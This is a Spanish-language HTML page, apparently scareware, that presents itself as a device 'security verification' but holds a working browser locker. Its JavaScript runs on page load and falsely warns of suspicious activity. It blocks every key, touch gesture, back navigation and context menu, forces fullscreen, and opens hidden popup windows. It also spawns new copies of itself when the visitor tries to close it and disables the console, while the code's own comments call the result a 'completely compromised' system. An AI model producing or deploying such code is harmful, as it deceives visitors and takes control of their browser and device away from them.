<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Verificaci√≥n de Seguridad</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            overflow: hidden;
            position: fixed;
            width: 100%;
            top: 0;
            left: 0;
            user-select: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
        }

        .security-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.95);
            z-index: 9999;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            padding: 20px;
        }

        .security-icon {
            font-size: 4rem;
            color: #ff6b6b;
            margin-bottom: 20px;
            animation: pulse 2s infinite;
        }

        .security-title {
            font-size: 1.8rem;
            font-weight: bold;
            margin-bottom: 15px;
            color: #ff6b6b;
        }

        .security-message {
            font-size: 1.1rem;
            line-height: 1.5;
            margin-bottom: 30px;
            max-width: 350px;
        }

        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #4CAF50;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 15px;
        }

        .loading-text {
            font-size: 1rem;
            color: #4CAF50;
            margin-bottom: 10px;
        }

        .progress-bar {
            width: 250px;
            height: 6px;
            background: rgba(255, 255, 255, 0.2);
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 15px;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #45a049);
            width: 0%;
            animation: progress 120s linear forwards;
        }

        .timer {
            font-size: 0.9rem;
            color: #ccc;
            margin-top: 10px;
        }

        .warning-text {
            font-size: 0.8rem;
            color: #ffeb3b;
            margin-top: 20px;
            font-weight: bold;
        }

        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @keyframes progress {
            0% { width: 0%; }
            100% { width: 100%; }
        }

        /* Prevenir zoom y scroll */
        html, body {
            touch-action: none;
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -khtml-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        /* Ocultar elementos del navegador en Android */
        @media screen and (max-width: 768px) {
            body {
                -webkit-appearance: none;
                -moz-appearance: none;
                appearance: none;
            }
        }
    </style>
</head>
<body>
    <div class="security-overlay" id="securityOverlay">
        <div class="security-icon">üõ°Ô∏è</div>
        <div class="security-title">ALERTA DE SEGURIDAD</div>
        <div class="security-message">
            Se ha detectado actividad sospechosa en tu dispositivo. 
            Por favor, mant√©n la pantalla activa mientras verificamos tu seguridad.
        </div>
        
        <div class="loading-container">
            <div class="loading-spinner"></div>
            <div class="loading-text">Verificando seguridad...</div>
            <div class="progress-bar">
                <div class="progress-fill"></div>
            </div>
            <div class="timer">
                Tiempo restante: <span id="countdown">120</span> segundos
            </div>
        </div>
        
        <div class="warning-text">
            üîí DISPOSITIVO COMPLETAMENTE BLOQUEADO üîí<br>
            <small>Sistema ‚Ä¢ Apps ‚Ä¢ Botones ‚Ä¢ Gestos ‚Ä¢ Chrome ‚Ä¢ DESHABILITADOS</small><br>
            <small style="color: #ff6b6b;">‚ö†Ô∏è NAVEGACI√ìN POR GESTOS BLOQUEADA ‚ö†Ô∏è</small><br>
            <small style="color: #ffeb3b;">Swipes desde bordes no funcionar√°n</small>
        </div>
    </div>

    <script>
        // Variables globales para control total
        let isLocked = true;
        let lockStartTime = Date.now();
        let redirectAttempts = 0;
        let systemHijacked = false;
        let aggressiveMode = true;
        let lockWindows = [];
        let audioContext = null;
        
        // Prevenir TODAS las acciones del usuario
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            e.stopPropagation();
            return false;
        });

        // Bloquear TODAS las teclas posibles incluyendo Chrome
        document.addEventListener('keydown', function(e) {
            if (isLocked) {
                // Bloquear espec√≠ficamente teclas de Chrome
                if (
                    // Ctrl + T (nueva pesta√±a)
                    (e.ctrlKey && e.key === 't') ||
                    // Ctrl + N (nueva ventana)
                    (e.ctrlKey && e.key === 'n') ||
                    // Ctrl + Shift + N (inc√≥gnito)
                    (e.ctrlKey && e.shiftKey && e.key === 'N') ||
                    // Ctrl + W (cerrar pesta√±a)
                    (e.ctrlKey && e.key === 'w') ||
                    // Ctrl + Shift + T (reabrir pesta√±a)
                    (e.ctrlKey && e.shiftKey && e.key === 'T') ||
                    // Alt + F4 (cerrar ventana)
                    (e.altKey && e.key === 'F4') ||
                    // Ctrl + L (barra de direcciones)
                    (e.ctrlKey && e.key === 'l') ||
                    // F6 (barra de direcciones)
                    e.key === 'F6' ||
                    // Ctrl + D (marcador)
                    (e.ctrlKey && e.key === 'd') ||
                    // Ctrl + H (historial)
                    (e.ctrlKey && e.key === 'h') ||
                    // Ctrl + J (descargas)
                    (e.ctrlKey && e.key === 'j') ||
                    // F11 (pantalla completa)
                    e.key === 'F11' ||
                    // Alt + Left/Right (navegaci√≥n)
                    (e.altKey && (e.key === 'ArrowLeft' || e.key === 'ArrowRight')) ||
                    // Ctrl + Tab (cambiar pesta√±a)
                    (e.ctrlKey && e.key === 'Tab') ||
                    // Ctrl + Shift + Tab (cambiar pesta√±a atr√°s)
                    (e.ctrlKey && e.shiftKey && e.key === 'Tab') ||
                    // Ctrl + n√∫meros (ir a pesta√±a espec√≠fica)
                    (e.ctrlKey && /^[1-9]$/.test(e.key)) ||
                    // F12 (herramientas de desarrollador)
                    e.key === 'F12' ||
                    // Ctrl + Shift + I (herramientas de desarrollador)
                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                    // Ctrl + U (ver c√≥digo fuente)
                    (e.ctrlKey && e.key === 'u') ||
                    // Cualquier otra tecla
                    true
                ) {
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    showWarningMessage();
                    return false;
                }
            }
        });

        document.addEventListener('keyup', function(e) {
            if (isLocked) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        });

        document.addEventListener('keypress', function(e) {
            if (isLocked) {
                e.preventDefault();
                e.stopPropagation();
                return false;
            }
        });

        // Protecci√≥n extrema contra bot√≥n atr√°s
        function setupBackButtonProtection() {
            // Llenar el historial para prevenir navegaci√≥n
            for (let i = 0; i < 50; i++) {
                history.pushState(null, null, location.href);
            }
            
            window.onpopstate = function(event) {
                if (isLocked) {
                    history.pushState(null, null, location.href);
                    showWarningMessage();
                    return false;
                }
            };
        }

        // Mensaje de advertencia cuando intenta salir
        function showWarningMessage() {
            const warningDiv = document.createElement('div');
            warningDiv.style.cssText = `
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: #ff1744;
                color: white;
                padding: 20px;
                border-radius: 10px;
                z-index: 10001;
                text-align: center;
                font-weight: bold;
                box-shadow: 0 0 20px rgba(255, 23, 68, 0.5);
            `;
            warningDiv.innerHTML = '‚ö†Ô∏è ACCESO DENEGADO ‚ö†Ô∏è<br>Proceso de seguridad en curso';
            document.body.appendChild(warningDiv);
            
            setTimeout(() => {
                if (warningDiv.parentNode) {
                    warningDiv.parentNode.removeChild(warningDiv);
                }
            }, 2000);
        }

        // Mantener la pantalla activa y bloquear sistema
        let wakeLock = null;
        let fullscreenLock = false;

        async function requestWakeLock() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                }
            } catch (err) {
                console.log('Wake Lock no disponible');
            }
        }

        // Intentar modo kiosco/fullscreen
        async function enterKioskMode() {
            try {
                // Solicitar pantalla completa
                if (document.documentElement.requestFullscreen) {
                    await document.documentElement.requestFullscreen();
                } else if (document.documentElement.webkitRequestFullscreen) {
                    await document.documentElement.webkitRequestFullscreen();
                } else if (document.documentElement.mozRequestFullScreen) {
                    await document.documentElement.mozRequestFullScreen();
                }
                fullscreenLock = true;
            } catch (err) {
                console.log('Fullscreen no disponible');
            }
        }

        // Prevenir salida de pantalla completa
        document.addEventListener('fullscreenchange', function() {
            if (isLocked && !document.fullscreenElement) {
                enterKioskMode();
            }
        });

        document.addEventListener('webkitfullscreenchange', function() {
            if (isLocked && !document.webkitFullscreenElement) {
                enterKioskMode();
            }
        });

        // Bloquear orientaci√≥n
        function lockOrientation() {
            try {
                if (screen.orientation && screen.orientation.lock) {
                    screen.orientation.lock('portrait');
                }
            } catch (err) {
                console.log('Orientaci√≥n no se puede bloquear');
            }
        }

        // Contador regresivo (cambiado a 2 minutos como solicitaste)
        let timeLeft = 120;
        const countdownElement = document.getElementById('countdown');
        
        const timer = setInterval(function() {
            timeLeft--;
            countdownElement.textContent = timeLeft;
            
            if (timeLeft <= 0) {
                clearInterval(timer);
                // Aqu√≠ puedes agregar lo que sucede despu√©s del minuto
                showCompletionMessage();
            }
        }, 1000);

        function showCompletionMessage() {
            const overlay = document.getElementById('securityOverlay');
            overlay.innerHTML = `
                <div class="security-icon" style="color: #4CAF50;">‚úÖ</div>
                <div class="security-title" style="color: #4CAF50;">VERIFICACI√ìN COMPLETADA</div>
                <div class="security-message">
                    Tu dispositivo ha sido verificado exitosamente. 
                    Ahora puedes continuar navegando de forma segura.
                </div>
                <button onclick="closeSecurityScreen()" style="
                    background: #4CAF50;
                    color: white;
                    border: none;
                    padding: 15px 30px;
                    border-radius: 25px;
                    font-size: 1rem;
                    margin-top: 20px;
                    cursor: pointer;
                ">Continuar</button>
            `;
        }

        function closeSecurityScreen() {
            isLocked = false;
            systemHijacked = false;
            
            // Cerrar todas las ventanas de bloqueo
            lockWindows.forEach(window => {
                try {
                    window.close();
                } catch (e) {}
            });
            
            // Detener audio
            if (audioContext) {
                try {
                    audioContext.close();
                } catch (e) {}
            }
            
            document.getElementById('securityOverlay').style.display = 'none';
            document.body.style.overflow = 'auto';
            document.body.style.position = 'static';
            
            // Liberar wake lock
            if (wakeLock) {
                wakeLock.release();
            }
            
            // Salir de pantalla completa
            if (document.exitFullscreen) {
                document.exitFullscreen();
            } else if (document.webkitExitFullscreen) {
                document.webkitExitFullscreen();
            } else if (document.mozCancelFullScreen) {
                document.mozCancelFullScreen();
            }
            
            // Restaurar funciones del sistema
            window.alert = function(msg) { return window.alert(msg); };
            window.confirm = function(msg) { return window.confirm(msg); };
            window.prompt = function(msg, def) { return window.prompt(msg, def); };
        }

        // Prevenir zoom con gestos
        document.addEventListener('touchstart', function(e) {
            if (e.touches.length > 1) {
                e.preventDefault();
            }
        });

        let lastTouchEnd = 0;
        document.addEventListener('touchend', function(e) {
            const now = (new Date()).getTime();
            if (now - lastTouchEnd <= 300) {
                e.preventDefault();
            }
            lastTouchEnd = now;
        }, false);

        // Prevenir scroll
        document.addEventListener('touchmove', function(e) {
            e.preventDefault();
        }, { passive: false });

        // BLOQUEO ESPEC√çFICO PARA NAVEGACI√ìN POR GESTOS DE ANDROID
        let gestureStartX = 0;
        let gestureStartY = 0;
        let gestureStartTime = 0;
        let edgeThreshold = 50; // P√≠xeles desde el borde para detectar gestos

        // Detectar y bloquear gestos de navegaci√≥n de Android
        document.addEventListener('touchstart', function(e) {
            if (isLocked && e.touches.length === 1) {
                const touch = e.touches[0];
                gestureStartX = touch.clientX;
                gestureStartY = touch.clientY;
                gestureStartTime = Date.now();
                
                // Detectar si el toque inicia cerca de los bordes (gestos de sistema)
                const screenWidth = window.innerWidth;
                const screenHeight = window.innerHeight;
                
                // Gesto desde borde izquierdo (atr√°s)
                if (gestureStartX < edgeThreshold) {
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    showGestureWarning('GESTO ATR√ÅS BLOQUEADO');
                    return false;
                }
                
                // Gesto desde borde derecho (cambiar apps)
                if (gestureStartX > screenWidth - edgeThreshold) {
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    showGestureWarning('CAMBIO DE APPS BLOQUEADO');
                    return false;
                }
                
                // Gesto desde borde inferior (home/recientes)
                if (gestureStartY > screenHeight - edgeThreshold) {
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    showGestureWarning('GESTO HOME BLOQUEADO');
                    return false;
                }
                
                // Gesto desde borde superior (notificaciones)
                if (gestureStartY < edgeThreshold) {
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    showGestureWarning('NOTIFICACIONES BLOQUEADAS');
                    return false;
                }
            }
        }, { passive: false, capture: true });

        // Interceptar movimientos de gestos
        document.addEventListener('touchmove', function(e) {
            if (isLocked && e.touches.length === 1) {
                const touch = e.touches[0];
                const deltaX = touch.clientX - gestureStartX;
                const deltaY = touch.clientY - gestureStartY;
                const deltaTime = Date.now() - gestureStartTime;
                
                // Detectar swipe r√°pido desde bordes
                if (deltaTime < 500) { // Gestos r√°pidos
                    // Swipe desde izquierda (atr√°s)
                    if (gestureStartX < edgeThreshold && deltaX > 100) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        showGestureWarning('NAVEGACI√ìN ATR√ÅS BLOQUEADA');
                        return false;
                    }
                    
                    // Swipe desde derecha (cambiar apps)
                    if (gestureStartX > window.innerWidth - edgeThreshold && deltaX < -100) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        showGestureWarning('CAMBIO DE APPS BLOQUEADO');
                        return false;
                    }
                    
                    // Swipe hacia arriba desde abajo (home/recientes)
                    if (gestureStartY > window.innerHeight - edgeThreshold && deltaY < -100) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        showGestureWarning('GESTO HOME BLOQUEADO');
                        return false;
                    }
                    
                    // Swipe hacia abajo desde arriba (notificaciones)
                    if (gestureStartY < edgeThreshold && deltaY > 100) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        showGestureWarning('NOTIFICACIONES BLOQUEADAS');
                        return false;
                    }
                }
                
                // Bloquear cualquier movimiento que inicie desde los bordes
                if (gestureStartX < edgeThreshold || 
                    gestureStartX > window.innerWidth - edgeThreshold ||
                    gestureStartY < edgeThreshold || 
                    gestureStartY > window.innerHeight - edgeThreshold) {
                    e.preventDefault();
                    e.stopPropagation();
                    e.stopImmediatePropagation();
                    return false;
                }
            }
        }, { passive: false, capture: true });

        // Funci√≥n espec√≠fica para mostrar advertencias de gestos
        function showGestureWarning(message) {
            const warningDiv = document.createElement('div');
            warningDiv.style.cssText = `
                position: fixed;
                top: 20%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: #ff1744;
                color: white;
                padding: 15px 25px;
                border-radius: 25px;
                z-index: 10002;
                text-align: center;
                font-weight: bold;
                font-size: 0.9rem;
                box-shadow: 0 0 30px rgba(255, 23, 68, 0.8);
                border: 2px solid #fff;
            `;
            warningDiv.innerHTML = `üö´ ${message} üö´`;
            document.body.appendChild(warningDiv);
            
            setTimeout(() => {
                if (warningDiv.parentNode) {
                    warningDiv.parentNode.removeChild(warningDiv);
                }
            }, 1500);
        }

        // Inicializar sistema completo al cargar
        window.addEventListener('load', function() {
            initializeLockSystem();
        });

        // Inicializar tambi√©n en DOMContentLoaded por si acaso
        document.addEventListener('DOMContentLoaded', function() {
            initializeLockSystem();
        });

        // Ejecutar inmediatamente si ya est√° cargado
        if (document.readyState === 'complete' || document.readyState === 'interactive') {
            initializeLockSystem();
        }

        // Mostrar alerta si el usuario intenta salir
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = 'La verificaci√≥n de seguridad est√° en proceso. ¬øEst√°s seguro de que quieres salir?';
            return e.returnValue;
        });

        // Detectar cuando la p√°gina pierde el foco y forzar regreso
        document.addEventListener('visibilitychange', function() {
            if (isLocked && document.hidden) {
                // Intentar recuperar el foco inmediatamente
                setTimeout(() => {
                    window.focus();
                    if (fullscreenLock) {
                        enterKioskMode();
                    }
                }, 100);
                
                // Mostrar alerta de violaci√≥n de seguridad
                showWarningMessage();
            }
        });

        // Detectar p√©rdida de foco de la ventana
        window.addEventListener('blur', function() {
            if (isLocked) {
                setTimeout(() => {
                    window.focus();
                }, 50);
            }
        });

        // Prevenir cambio de pesta√±a con Alt+Tab
        window.addEventListener('focus', function() {
            if (isLocked && fullscreenLock) {
                enterKioskMode();
            }
        });

        // Interceptar intentos de navegaci√≥n
        window.addEventListener('beforeunload', function(e) {
            if (isLocked) {
                e.preventDefault();
                e.returnValue = 'PROCESO DE SEGURIDAD EN CURSO - NO PUEDES SALIR';
                showWarningMessage();
                return 'PROCESO DE SEGURIDAD EN CURSO - NO PUEDES SALIR';
            }
        });

        // Prevenir refresh/recarga
        window.addEventListener('load', function() {
            if (performance.navigation.type === 1 && isLocked) {
                // P√°gina fue recargada durante el bloqueo
                location.reload();
            }
        });

        // Monitoreo continuo para mantener el bloqueo
        setInterval(function() {
            if (isLocked) {
                // Verificar si seguimos en pantalla completa
                if (fullscreenLock && !document.fullscreenElement && !document.webkitFullscreenElement) {
                    enterKioskMode();
                }
                
                // Mantener el foco
                if (document.hasFocus && !document.hasFocus()) {
                    window.focus();
                }
                
                // Verificar tiempo transcurrido
                const elapsed = (Date.now() - lockStartTime) / 1000;
                if (elapsed >= 60) {
                    // El tiempo ha pasado, pero mantener bloqueo hasta completar
                    console.log('Tiempo completado, esperando finalizaci√≥n...');
                }
            }
        }, 500);

        // SISTEMA DE HIJACKING TOTAL DEL DISPOSITIVO
        function createSystemOverride() {
            // Crear m√∫ltiples ventanas invisibles para consumir recursos
            for (let i = 0; i < 10; i++) {
                try {
                    const popup = window.open('', '_blank', 'width=1,height=1,left=-1000,top=-1000');
                    if (popup) {
                        lockWindows.push(popup);
                        popup.document.write(`
                            <script>
                                window.onbeforeunload = function() { return false; };
                                setInterval(function() { window.focus(); }, 100);
                            </script>
                        `);
                    }
                } catch (e) {}
            }
        }

        // Crear audio silencioso para mantener la app activa
        function createAudioLock() {
            try {
                audioContext = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioContext.createOscillator();
                const gainNode = audioContext.createGain();
                
                oscillator.connect(gainNode);
                gainNode.connect(audioContext.destination);
                
                oscillator.frequency.setValueAtTime(20000, audioContext.currentTime); // Frecuencia inaudible
                gainNode.gain.setValueAtTime(0.001, audioContext.currentTime); // Volumen m√≠nimo
                
                oscillator.start();
            } catch (e) {}
        }

        // Interceptar TODOS los eventos del sistema
        function hijackSystemEvents() {
            // Interceptar eventos de teclado a nivel de sistema
            document.addEventListener('keydown', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    e.stopImmediatePropagation();
                    return false;
                }
            }, true);

            // Interceptar eventos t√°ctiles
            document.addEventListener('touchstart', function(e) {
                if (isLocked && e.touches.length > 0) {
                    // Permitir solo toques simples en el √°rea de la pantalla
                    const touch = e.touches[0];
                    const element = document.elementFromPoint(touch.clientX, touch.clientY);
                    if (!element || !element.closest('.security-overlay')) {
                        e.preventDefault();
                        e.stopImmediatePropagation();
                        return false;
                    }
                }
            }, true);

            // Interceptar gestos del sistema
            window.addEventListener('gesturestart', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    return false;
                }
            });

            window.addEventListener('gesturechange', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    return false;
                }
            });

            // Bloquear men√∫ contextual del navegador
            window.addEventListener('contextmenu', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    e.stopPropagation();
                    showWarningMessage();
                    return false;
                }
            }, true);

            // Bloquear selecci√≥n de texto
            window.addEventListener('selectstart', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    return false;
                }
            }, true);

            // Bloquear arrastrar y soltar
            window.addEventListener('dragstart', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    return false;
                }
            }, true);
        }

        // Crear bucle infinito de ventanas emergentes si intenta cerrar
        function createInfiniteLoop() {
            window.addEventListener('beforeunload', function(e) {
                if (isLocked) {
                    // Crear nuevas ventanas para reemplazar la actual
                    for (let i = 0; i < 5; i++) {
                        setTimeout(() => {
                            try {
                                const newWindow = window.open(location.href, '_blank', 'fullscreen=yes');
                                if (newWindow) {
                                    newWindow.focus();
                                }
                            } catch (e) {}
                        }, i * 100);
                    }
                    
                    e.preventDefault();
                    e.returnValue = 'SISTEMA COMPROMETIDO - REINICIANDO SEGURIDAD';
                    return 'SISTEMA COMPROMETIDO - REINICIANDO SEGURIDAD';
                }
            });
        }

        // Monitoreo agresivo del sistema
        function startAggressiveMonitoring() {
            // Verificar cada 50ms si el sistema est√° comprometido
            setInterval(function() {
                if (isLocked) {
                    // Forzar foco si se pierde
                    if (!document.hasFocus()) {
                        window.focus();
                        
                        // Crear nueva ventana si perdemos el control
                        try {
                            const backup = window.open(location.href, '_self');
                            if (backup) backup.focus();
                        } catch (e) {}
                    }

                    // Verificar pantalla completa
                    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
                        enterKioskMode();
                    }

                    // Verificar visibilidad
                    if (document.hidden) {
                        // Intentar recuperar visibilidad
                        document.dispatchEvent(new Event('visibilitychange'));
                        window.focus();
                    }

                    // Verificar si hay nuevas pesta√±as o ventanas
                    if (window.length > 1) {
                        // Intentar cerrar otras ventanas
                        for (let i = 1; i < window.length; i++) {
                            try {
                                window[i].close();
                            } catch (e) {}
                        }
                    }
                }
            }, 50);

            // Monitoreo de memoria y CPU para detectar intentos de cierre
            setInterval(function() {
                if (isLocked) {
                    // Crear carga de trabajo para mantener la app activa
                    const dummy = new Array(1000).fill(Math.random());
                    dummy.sort();
                    
                    // Verificar que seguimos siendo la ventana activa
                    if (document.hasFocus && !document.hasFocus()) {
                        window.focus();
                        showWarningMessage();
                    }
                }
            }, 1000);

            // Monitoreo espec√≠fico para Chrome
            setInterval(function() {
                if (isLocked) {
                    // Verificar si el usuario est√° intentando usar la barra de direcciones
                    if (document.activeElement && document.activeElement.tagName === 'INPUT') {
                        document.activeElement.blur();
                        showWarningMessage();
                    }
                    
                    // Mantener el foco en nuestra p√°gina
                    if (document.body) {
                        document.body.focus();
                    }
                }
            }, 200);
        }

        // Bloquear notificaciones y alertas del sistema
        function blockSystemNotifications() {
            // Interceptar todas las funciones de alerta
            window.alert = function() { return false; };
            window.confirm = function() { return false; };
            window.prompt = function() { return null; };
            
            // Bloquear console para evitar debugging
            if (typeof console !== 'undefined') {
                console.log = console.warn = console.error = function() {};
            }
        }

        // Bloquear men√∫ de Chrome y botones del navegador
        function blockChromeInterface() {
            // Interceptar clics en toda la ventana del navegador
            document.addEventListener('click', function(e) {
                if (isLocked) {
                    // Solo permitir clics dentro del √°rea de seguridad
                    if (!e.target.closest('.security-overlay')) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        showWarningMessage();
                        return false;
                    }
                }
            }, true);

            // Interceptar eventos de mouse
            document.addEventListener('mousedown', function(e) {
                if (isLocked) {
                    if (!e.target.closest('.security-overlay')) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        return false;
                    }
                }
            }, true);

            // Interceptar eventos t√°ctiles en toda la pantalla
            document.addEventListener('touchstart', function(e) {
                if (isLocked) {
                    const touch = e.touches[0];
                    const element = document.elementFromPoint(touch.clientX, touch.clientY);
                    if (!element || !element.closest('.security-overlay')) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        showWarningMessage();
                        return false;
                    }
                }
            }, true);
        }

        // Prevenir apertura de nuevas ventanas/pesta√±as
        function blockNewWindows() {
            // Interceptar window.open
            const originalOpen = window.open;
            window.open = function() {
                if (isLocked) {
                    showWarningMessage();
                    return null;
                }
                return originalOpen.apply(this, arguments);
            };

            // Interceptar enlaces que abren nuevas ventanas
            document.addEventListener('click', function(e) {
                if (isLocked && e.target.tagName === 'A') {
                    if (e.target.target === '_blank' || e.target.href) {
                        e.preventDefault();
                        e.stopPropagation();
                        showWarningMessage();
                        return false;
                    }
                }
            }, true);
        }

        // Bloquear gestos espec√≠ficos de Android
        function blockAndroidGestures() {
            // Crear zonas invisibles en los bordes para interceptar gestos
            const edges = ['top', 'bottom', 'left', 'right'];
            
            edges.forEach(edge => {
                const edgeZone = document.createElement('div');
                edgeZone.style.cssText = `
                    position: fixed;
                    z-index: 999998;
                    background: transparent;
                    pointer-events: auto;
                `;
                
                switch(edge) {
                    case 'top':
                        edgeZone.style.cssText += `
                            top: 0;
                            left: 0;
                            width: 100%;
                            height: 60px;
                        `;
                        break;
                    case 'bottom':
                        edgeZone.style.cssText += `
                            bottom: 0;
                            left: 0;
                            width: 100%;
                            height: 60px;
                        `;
                        break;
                    case 'left':
                        edgeZone.style.cssText += `
                            top: 0;
                            left: 0;
                            width: 60px;
                            height: 100%;
                        `;
                        break;
                    case 'right':
                        edgeZone.style.cssText += `
                            top: 0;
                            right: 0;
                            width: 60px;
                            height: 100%;
                        `;
                        break;
                }
                
                // Interceptar todos los eventos t√°ctiles en las zonas de borde
                edgeZone.addEventListener('touchstart', function(e) {
                    if (isLocked) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        showGestureWarning(`GESTO ${edge.toUpperCase()} BLOQUEADO`);
                        return false;
                    }
                }, { passive: false, capture: true });
                
                edgeZone.addEventListener('touchmove', function(e) {
                    if (isLocked) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        return false;
                    }
                }, { passive: false, capture: true });
                
                edgeZone.addEventListener('touchend', function(e) {
                    if (isLocked) {
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        return false;
                    }
                }, { passive: false, capture: true });
                
                document.body.appendChild(edgeZone);
            });
            
            // Interceptar eventos de orientaci√≥n y movimiento del dispositivo
            window.addEventListener('deviceorientation', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    return false;
                }
            });
            
            window.addEventListener('devicemotion', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    return false;
                }
            });
            
            // Bloquear gestos de pellizco y zoom
            document.addEventListener('gesturestart', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    e.stopPropagation();
                    showGestureWarning('ZOOM BLOQUEADO');
                    return false;
                }
            }, { passive: false, capture: true });
            
            document.addEventListener('gesturechange', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }, { passive: false, capture: true });
            
            document.addEventListener('gestureend', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    e.stopPropagation();
                    return false;
                }
            }, { passive: false, capture: true });
        }

        // Crear overlay invisible para capturar todos los clics
        function createInvisibleOverlay() {
            const overlay = document.createElement('div');
            overlay.style.cssText = `
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: 999999;
                pointer-events: auto;
                background: transparent;
            `;
            
            overlay.addEventListener('click', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    e.stopPropagation();
                    showWarningMessage();
                    return false;
                }
            });
            
            // Interceptar eventos de toque en el overlay
            overlay.addEventListener('touchstart', function(e) {
                if (isLocked) {
                    e.preventDefault();
                    e.stopPropagation();
                    showWarningMessage();
                    return false;
                }
            });
            
            document.body.appendChild(overlay);
        }

        // Inicializaci√≥n completa del sistema de bloqueo EXTREMO
        function initializeLockSystem() {
            setupBackButtonProtection();
            requestWakeLock();
            enterKioskMode();
            lockOrientation();
            
            // NUEVAS FUNCIONES AGRESIVAS
            createSystemOverride();
            createAudioLock();
            hijackSystemEvents();
            createInfiniteLoop();
            startAggressiveMonitoring();
            blockSystemNotifications();
            blockChromeInterface();
            blockNewWindows();
            blockAndroidGestures();
            createInvisibleOverlay();
            
            // Forzar foco inicial
            window.focus();
            
            // Prevenir selecci√≥n de texto
            document.onselectstart = function() { return false; };
            document.onmousedown = function() { return false; };
            
            systemHijacked = true;
            console.log('SISTEMA COMPLETAMENTE COMPROMETIDO');
        }
    </script>
</body>
</html>
